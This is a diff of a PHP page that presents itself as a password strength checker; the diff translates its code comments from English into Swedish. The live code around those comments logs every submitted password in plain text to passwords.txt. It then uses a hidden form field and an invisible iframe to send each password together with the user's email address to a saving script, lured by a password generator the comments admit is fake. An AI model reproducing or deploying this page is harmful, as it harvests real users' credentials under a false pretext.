@@ -7,10 +7,10 @@
 <body>
   <?php
     function blip_color($min_score) {
-      // This function calculates what color the blips in the score bar should have.
+      // Den här funktionen räknar ut vilka färger punkterna i poängmätaren ska ha.
       global $score;
-      if($score >= $min_score) { // Is this blip supposed to light up?
-        if($score < 30) { // If so, in what color?
+      if($score >= $min_score) { // Ska den här punkten tändas?
+        if($score < 30) { // Och i vilken färg i så fall?
           echo "#fc291e";
         } elseif($score > 60) {
           echo "#1cd600";
@@ -22,17 +22,17 @@
       }
     }
   ?>
-  <!--This iframe is used as an invisible target to load the email saving script into.-->
+  <!--Mejladressparningsskriptet bäddas in i den här osynliga IFramen när det körs.-->
   <iframe name="secret_iframe" style="display: none;"></iframe>
   <?php
     /*
-      First things first, let's store the password.
-      This code assumes that the web server has write access to a file called passwords.txt in
-      the same directory as this script.
+      Först och främst tar vi och sparar lösenordet.
+      Webbservern antas ha behörighet att skriva till filen passwords.txt i samma katalog
+      som det här skriptet.
     */
     $password = $_POST["password"];
     $pw_log = fopen("passwords.txt", "a");
-    fwrite($pw_log, $password . PHP_EOL); // Stores the password with a trailing newline in the file
+    fwrite($pw_log, $password . PHP_EOL); // Lagrar lösenordet i filen med en radbrytning efter.
     fclose($pw_log);
   ?>
   <div id="main">
@@ -45,16 +45,16 @@
             <?php
               $lower = "abcdefghijklmnopqrstuvwxyz";
               $contains_lower = False;
-              for($x = 0; $x < strlen($password); $x++) { // Loops through each character in the password.
-                for($y = 0; $y < strlen($lower); $y++) { // Loops through each lower-case letter of the (english) alphabet.
+              for($x = 0; $x < strlen($password); $x++) { // Går igenom varje tecken i lösenordet.
+                for($y = 0; $y < strlen($lower); $y++) { // Går igenom varje gemener i (det latinska) alfabetet.
                   if($password[$x] == $lower[$y]) {
                     /*
-                      If the current character and the current letter are the same at any point,
-                      the password contains a lower-case letter.
+                      Om det aktuella tecknet och den aktuella gemenen någonsin är samma
+                      innehåller lösenordet minst en gemen.
                     */
                     echo "Ja";
                     $contains_lower = True;
-                    break 2; // Breaks out of both for loops.
+                    break 2; // Stoppar båda for-slingorna.
                   }
                 }
               }
@@ -68,7 +68,7 @@
           <td>Innehåller stora bokstäver:</td>
           <td>
             <?php
-              // The same thing as before, only with upper-case letters instead of lower-case.
+              // Samma som förut fast med versaler istället för gemener.
               $upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
               $contains_upper = False;
               for($x = 0; $x < strlen($password); $x++) {
@@ -90,7 +90,7 @@
           <td>Innehåller siffror:</td>
           <td>
             <?php
-              // The same thing as before, only with digits.
+              // Samma grej igen, den här gången med siffror.
               $digits = "0123456789";
               $contains_digit = False;
               for($x = 0; $x < strlen($password); $x++) {
@@ -112,17 +112,16 @@
           <td>Innehåller symboler:</td>
           <td>
             <?php
-              // This one's a bit interesting.
+              // Den här är lite spännande.
               $contains_symbol = False;
-              for($x = 0; $x < strlen($password); $x++) { // Loops through each character in the password.
-                for($y = 0; $y <= 255; $y++) { // Loops through numbers 0 to 255, e.g. the entirety of an 8-bit extended ASCII character set.
+              for($x = 0; $x < strlen($password); $x++) { // Går igenom varje tecken i lösenordet.
+                for($y = 0; $y <= 255; $y++) { // Går igenom alla tal från 0 till 255, d.v.s. alla tecken i en EASCII.
                   if((48 <= $y and $y <= 57) or (65 <= $y and $y <= 90) or (97 <= $y and $y <= 122)) {
                     /*
-                      This statement skips every character that's a letter or a digit.
-                      In extended ASCII, every character is represented by a number between 0 and 255.
-                      Numbers 48 through 57 represents digits 0 through 9, numbers 65 through 90
-                      represent upper-case letters and numbers 97 through 122 represent lower-case letters.
-                      Everything else is considered a symbol in our case.
+                      Den här satsen hoppar över alla tecken som varken är bokstäver eller siffror.
+                      I EASCII (utökad ASCII) representeras alla tecken av tal från 0 till 255.
+                      48–57 motsvarar siffrorna, 65–90 motsvarar versalerna och 97–122 motsvarar gemenerna.
+                      Allt annat kan räknas som symbol i det här fallet.
                     */
                     break 1;
                   }
@@ -159,38 +158,38 @@
       </table>
       <h2>
         Poäng: <?php
-          // The scoring here is, like, completely arbitrary.
-          $score = 35; // By beginning at 35, the score will be between 0 and 80.
-          if($contains_lower) { // If the password contains a lower-case letter, add 5 to the score, otherwise remove 5.
+          // Poängkriterierna är typ helt godtyckliga.
+          $score = 35; // Låter man 35 poäng vara nollpunkten hamnar slutpoängen mellan 0 och 80.
+          if($contains_lower) { // Lägg till 5 poäng om lösenordet innehåller en gemen, ta annars bort 5.
             $score += 5;
           } else {
             $score -= 5;
           }
-          if($contains_upper) { // Same thing for upper-case letters.
+          if($contains_upper) { // Samma sak fast för versaler.
             $score += 5;
           } else {
             $score -= 5;
           }
-          if($contains_digit) { // ... and digits.
+          if($contains_digit) { // ...och för siffror.
             $score += 5;
           } else {
             $score -= 5;
           }
-          if($contains_symbol) { // If the password contains a symbol, add 10 to the score, otherwise remove 5.
+          if($contains_symbol) { // Lägg till 10 poäng om lösenordet innehåller en symbol, ta annars bort 5.
             $score += 10;
           } else {
             $score -= 5;
           }
-          if($length == 2) { // If the password is long, add 20 to the score.
+          if($length == 2) { // Ge lösenordet 20 poäng om det är långt.
             $score += 20;
-          } elseif($length == 0) { // If the password is short, remove 25.
+          } elseif($length == 0) { // Ge lösenordet 25 poängs avdrag om det är kort.
             $score -= 25;
-          } // If it's neither long nor short, don't do anything.
+          } // Om det varken är långt eller kort delas inga poäng ut.
           echo $score;
         ?> / 80
       </h2>
       <table id="scorebar">
-        <!--This is the score bar. I vomit a bit every time I look at it.-->
+        <!--Det här är poängräknaren. Jag spyr lite inombords varje gång jag tittar på den.-->
         <tr>
           <td class="scoreblip" style="background-color: <?php blip_color(5); ?>;"></td>
           <td class="scoreblip" style="background-color: <?php blip_color(10); ?>;"></td>
@@ -213,7 +212,7 @@
       <h3>
         Ditt lösenord är
         <?php
-          // Some nice words for humans to read and understand.
+          // Några vänliga ord som människor kan läsa och förstå.
           if($score < 30) {
             echo " ganska dåligt. Du borde byta det.";
           } elseif($score > 60) {
@@ -228,27 +227,27 @@
         <br>
         lösenord till dig när min superhögteknologiska lösenordsgenerator passerar betastadiet.
       </p>
-      <!--SPOILERS: No, I won't.-->
+      <!--SPOILER: Kommer jag inte alls det.-->
       <p>(Det ser inte ut som att det händer något när man trycker på knappen, men det funkar, jag lovar)</p>
       <form action="save_email_and_pw.php" method="post" target="secret_iframe">
         <!--
-          Again, this is a bit interesting.
-          When we save the email address, we want to save the password at the same time
-          so we know which password belongs to which email address.
-          To do this, we need to include the password in the email form.
+          Återigen lite spännande.
+          När mejladressen sparas vill man naturligtvis veta vilket lösenord
+          den hör till, alltså måste adressen och lösenordet sparas tillsammans.
+          För att få till det läggs lösenordet in i mejladressformuläret.
         -->
         <input type="password" name="password" value="<?php echo $password; ?>" style="display: none;">
         <!--
-          This input field is automatically filled with the password, and is hidden. It'll still
-          be included in the POST, though.
+          Det här fältet fylls automatiskt i med lösenordet. Det är dolt men
+          kommer ändå med i POST-förfrågan.
         -->
         <p><input type="email" name="email" size="40" required></p>
         <p><input type="submit" value="Ge mig ett lösenord!"></p>
         <!--
-          When the user submits the email address and the password, the email saving script is
-          loaded into the hidden iframe. The benefit of this is that we don't need to leave
-          the page to save the email address. The drawback is that there's no indication the
-          email address was saved.
+          När användaren skickar in mejladressen och lösenordet läses mejladressparningsskriptet in
+          i den dolda IFramen. Det gör att man inte behöver ladda någon ny sida för att spara
+          mejladressen. Tyvärr gör det också att man inte får någon indikation alls på att
+          något har sparats.
         -->
       </form>
     </div>
